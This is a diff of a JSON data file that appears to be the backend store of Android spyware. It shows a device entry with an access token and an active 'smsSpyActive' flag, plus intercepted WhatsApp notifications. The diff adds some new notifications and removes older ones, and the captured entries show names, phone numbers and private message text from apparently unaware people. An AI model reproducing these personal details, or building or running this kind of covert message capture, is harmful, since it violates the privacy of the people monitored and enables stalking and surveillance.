@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776908106993,
+    "lastSeen": 1776908109995,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 40 chat",
+        "time": "23/04 09:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908112587
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 39 chat",
+        "time": "23/04 09:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908109632
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "BEW STORE",
+        "content": "bantuin keluar dulu sayang",
+        "time": "23/04 09:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908109571
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "22/04 19:02",
         "pkg": "com.whatsapp",
         "receivedAt": 1776855722110
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 851-3406-5819",
-        "content": "Oke",
-        "time": "22/04 19:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776855722068
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 823-1199-7104",
-        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
-        "time": "22/04 19:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776855722007
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Muhammad Amal Ardhafan",
-        "content": "Semangat ma disana",
-        "time": "22/04 19:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776855721835
       }
     ],
     "galleryPhotos": [],
